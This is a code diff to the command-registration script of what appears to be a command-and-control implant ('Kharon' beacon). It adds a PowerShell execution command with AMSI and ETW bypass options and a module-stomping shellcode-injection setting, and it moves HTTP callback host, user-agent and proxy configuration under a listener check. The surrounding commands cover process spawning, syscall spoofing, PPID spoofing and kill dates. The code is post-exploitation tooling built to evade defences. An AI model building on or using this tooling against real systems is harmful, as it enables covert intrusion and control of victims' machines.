@@ -76,12 +76,13 @@ function RegisterCommands(listenerType)
     let cmd_ps_run = ax.create_command("run", "Execute a new process with specified command line", "ps run \"cmd.exe /c whoami /all\"", "Task: create and execute new process");
     cmd_ps_run.addArgString("cmd", true, "Full command line with arguments");
 
-    let cmd_ps_pwsh = ax.create_command("pwsh", "Execute powershell command", "ps pwsh -c Get-Domain -s /opt/PowerView.ps1", "Task: create and execute powershell command")
-    cmd_ps_list.addArgFlagString("-c", "cmd", true)
-    cmd_ps_list.addArgFlagString("-s", "script", false)
+    let cmd_ps_pwsh = ax.create_command("pwsh", "Execute powershell command", "ps pwsh -c Get-Domain -s /opt/PowerView.ps1", "Task: create and execute powershell command");
+    cmd_ps_pwsh.addArgFlagString("-c", "cmd", true);
+    cmd_ps_pwsh.addArgFlagFile("-s", "script", false);
+    cmd_ps_pwsh.addArgFlagString("-b", "bypass", false, "Options: 'amsi', 'etw', 'all' or 'none'");
 
     let cmd_ps = ax.create_command("ps", "Process management - list, create, and terminate processes");
-    cmd_ps.addSubCommands([cmd_ps_list, cmd_ps_run, _cmd_ps_kill]);
+    cmd_ps.addSubCommands([cmd_ps_list, cmd_ps_run, cmd_ps_pwsh, _cmd_ps_kill]);
 
     /// JOB
     /// let cmd_job_list = ax.create_command("list", "Display all currently running background jobs", "job list", "Task: enumerate running jobs");
@@ -163,6 +164,9 @@ function RegisterCommands(listenerType)
     let cmd_config_inject_type = ax.create_command("inject.technique", "Change the technique to use for shellcode injection and postex", "config inject.technique stomping", "Task: configure injection technique")
     cmd_config_inject_type.addArgString("technique", true, "Options 'stomping' or 'standard'")
 
+    let cmd_config_inject_stomp = ax.create_command("inject.stompmodule", "Change the prefered module for use in stomping", "config inject.stompmodule chakra.dll", "Task: configure injection stomp module")
+    cmd_config_inject_stomp.addArgFlagString("module", true)
+
     let cmd_config_wkrtime = ax.create_command("worktime", "Set operational hours for beacon activity", "config worktime 09:00 18:00", "Task: configure working hours");
     cmd_config_wkrtime.addArgString("start", true);
     cmd_config_wkrtime.addArgString("end", true);
@@ -171,28 +175,36 @@ function RegisterCommands(listenerType)
     cmd_config_syscall.addArgString("syscall", true, "options: 'spoof', 'spoof_indirect' or 'none'");
 
     let cmd_config_forkpipe = ax.create_command("fork_pipe_name", "Change named pipe to use in fork commands", "config fork_pipe_name \\\\.\\pipe\\new_pipe_name");
-    cmd_config_forkpipe.addArgString("name", true)
+    cmd_config_forkpipe.addArgString("name", true);
 
-    let cmd_config_callbackhost = ax.create_command("callback.http.host", "Change the callback host list for http profile (use 'info' command to show callback settings)", "config callbackhost add server1337.com:443");
-    cmd_config_callbackhost.addArgString("action", true)
-    cmd_config_callbackhost.addArgString("callback_host", true)
-
-    let cmd_config_callbackuseragent = ax.create_command("callback.http.useragent", "Change the callback host list for http profile (use 'info' command to show callback settings)", "config callbackhost add server1337.com:443");
-    cmd_config_callbackuseragent.addArgString("useragent", true)
-
-    let cmd_config_callbackproxy = ax.create_command("callback.http.proxy", "Change the callback host list for http profile (use 'info' command to show callback settings)", "config callbackhost add server1337.com:443");
-    cmd_config_callbackproxy.addArgBool("enabled", true)
-    cmd_config_callbackproxy.addArgString("url", false)
-    cmd_config_callbackproxy.addArgString("username", false)
-    cmd_config_callbackproxy.addArgString("password", false)
-
-    let cmd_config = ax.create_command("config", "Configuration management - adjust beacon behavior and settings", "config sleep 50s");
-    cmd_config.addSubCommands([
+    let cmd_config_subcommands = [
         cmd_config_sleep, cmd_config_jitter, cmd_config_ppid, cmd_config_blockdll, cmd_config_wkrtime,
         cmd_config_killdate_date, cmd_config_killdate_exit, cmd_config_killdate_selfdel, 
         cmd_config_heap_obf, cmd_config_mask, cmd_config_amsietwbypass, cmd_config_spawnto,
-        cmd_config_inject_write, cmd_config_inject_alloc, cmd_config_syscall, cmd_config_forkpipe, cmd_config_callbackhost
-    ]);
+        cmd_config_inject_type, cmd_config_inject_stomp, cmd_config_inject_alloc, cmd_config_inject_write, cmd_config_syscall, cmd_config_forkpipe
+    ];
+
+    if (listenerType == "KharonHTTP") {
+        let cmd_config_callbackhost = ax.create_command("callback.http.host", "Change the callback host list for http profile (use 'info' command to show callback settings)", "config callback.http.host add server1337.com:443");
+        cmd_config_callbackhost.addArgString("action", true);
+        cmd_config_callbackhost.addArgString("callback_host", true);
+
+        let cmd_config_callbackuseragent = ax.create_command("callback.http.useragent", "Change the callback user agent settings for http profile (use 'info' command to show callback settings)", "config callback.http.useragent Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36");
+        cmd_config_callbackuseragent.addArgString("useragent", true);
+
+        let cmd_config_callbackproxy = ax.create_command("callback.http.proxy", "Change the callback proxy settings for http profile (use 'info' command to show callback settings)", "config callback.http.proxy enabled http://serverproxy:8080 username password");
+        cmd_config_callbackproxy.addArgBool("enabled", true);
+        cmd_config_callbackproxy.addArgString("url", false);
+        cmd_config_callbackproxy.addArgString("username", false);
+        cmd_config_callbackproxy.addArgString("password", false);
+
+        cmd_config_subcommands.push(cmd_config_callbackhost);
+        cmd_config_subcommands.push(cmd_config_callbackuseragent);
+        cmd_config_subcommands.push(cmd_config_callbackproxy);
+    }
+
+    let cmd_config = ax.create_command("config", "Configuration management - adjust beacon behavior and settings", "config sleep 50s");
+    cmd_config.addSubCommands(cmd_config_subcommands);
 
     /// INFO
 
@@ -388,7 +400,7 @@ function GenerateUI(listenerType)
     inject_shellcode.setCurrentIndex(0);
     
     // Adicionando o placeholder "Stomp Module"
-    let textStompModule = form.create_textline("");
+    let textStompModule = form.create_textline("chakra.dll");
     textStompModule.setPlaceholder("Stomp Module");
 
     let bof_api_check = form.create_check("BOF API Proxy");
